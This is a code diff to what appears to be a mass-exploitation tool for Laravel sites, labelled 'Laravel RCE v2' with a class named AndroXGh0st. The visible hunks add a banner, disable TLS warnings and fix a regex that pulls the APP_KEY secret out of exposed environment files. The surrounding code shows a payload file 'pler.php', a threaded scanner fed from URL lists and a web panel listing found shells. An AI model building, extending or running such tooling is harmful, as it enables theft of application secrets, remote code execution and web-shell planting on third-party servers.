@@ -1,5 +1,6 @@
 import hmac, hashlib, json, requests, re, threading, sys, os
 import base64
+import urllib3
 from hashlib import sha256
 from base64 import b64decode, b64encode
 from Crypto import Random
@@ -8,6 +9,9 @@ from queue import Queue
 from threading import Thread
 from flask import Flask, jsonify
 
+# Disable HTTPS warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 # Flask App
 shells_found = []
 app = Flask(__name__)
@@ -15,6 +19,20 @@ app = Flask(__name__)
 @app.route("/shells", methods=["GET"])
 def list_shells():
     return jsonify(shells_found)
+
+# ASCII Art Banner
+def print_banner():
+    banner = r"""
+   _____                           _       
+  / ____|                         | |      
+ | (___   ___  ___ _   _ __ __ _| |_ ___ 
+  \___ \ / _ \/ __| | | | '__/ _` | __/ _ \
+  ____) |  __/ (__| |_| | | | (_| | ||  __/
+ |_____/ \___|\___|\__,_|_|  \__,_|\__\___|
+
+            Sean - Laravel RCE v2
+    """
+    print(banner)
 
 # Payload configuration
 pathname = 'pler.php'
@@ -68,7 +86,7 @@ class AndroXGh0st:
 
     def get_env(self, text, url):
         if "APP_KEY" in text:
-            match = re.search("APP_KEY=([a-zA-Z0-9:;\\/\\\\=$%^&*()\-+_!@#]+)", text)
+            match = re.search(r"APP_KEY=([a-zA-Z0-9:;\\/\\\\=$%^&*()\-+_!@#]+)", text)
             if match:
                 appkey = match.group(1)
                 return appkey.strip('"\'')
@@ -119,6 +137,8 @@ if __name__ == "__main__":
         print("Usage:\n  python3 script.py check [url]\n  python3 script.py [list.txt] [threads]\n  python3 script.py panel  # to run web panel")
         sys.exit()
 
+    print_banner()  # Banner ditampilkan di sini
+
     mode = sys.argv[1]
     if mode == "check":
         exploit(sys.argv[2])
@@ -133,4 +153,3 @@ if __name__ == "__main__":
                 url = "http://" + url
             pool.add_task(exploit, url)
         pool.wait_completion()
-	    
